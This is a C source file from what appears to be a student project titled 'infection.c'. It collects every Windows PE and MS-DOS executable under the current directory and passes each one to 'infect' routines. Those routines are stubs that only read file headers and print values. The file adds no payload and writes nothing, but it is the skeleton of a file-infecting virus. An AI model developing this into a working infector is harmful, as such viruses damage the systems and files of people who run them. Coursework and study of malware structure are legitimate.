/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

/*
** Infect MS-DOS executable
*/
void		infect_dos_file(char *data, size_t size)
{
	if (size < sizeof(struct _IMAGE_DOS_HEADER))
		return ;
	struct _IMAGE_DOS_HEADER *header = (struct _IMAGE_DOS_HEADER*)data;

	printf("%d, %d\n", header->e_cblp, size);
}

/*
** Infect windows Portable executable
*/
void		infect_pe_file(char *data, size_t size)
{
	if (size < sizeof(struct _IMAGE_OPTIONAL_HEADER))
		return ;
	struct _IMAGE_OPTIONAL_HEADER *header = (struct _IMAGE_OPTIONAL_HEADER*)data;
}

/*
** Infect PE or MS-DOS windows files
*/
void		infect_file(char *file_path) {
	char	*file = NULL;
	size_t	size = file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	if (file_type == IS_PE_BINARY_TYPE) {
		printf("%s (PE)\n", file_path);
		infect_pe_file(file, size);
	} else if (file_type == IS_DOS_BINARY_TYPE) {
		printf("%s (MS-DOS)\n", file_path);
		infect_dos_file(file, size);
	}
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(void) {
	char **files = NULL;

	files = get_files_types(files, ".", is_windows_binary_file);

	for (int i = 0; files[i]; i++) {
		infect_file(files[i]);
	}
	free_array(files);
}
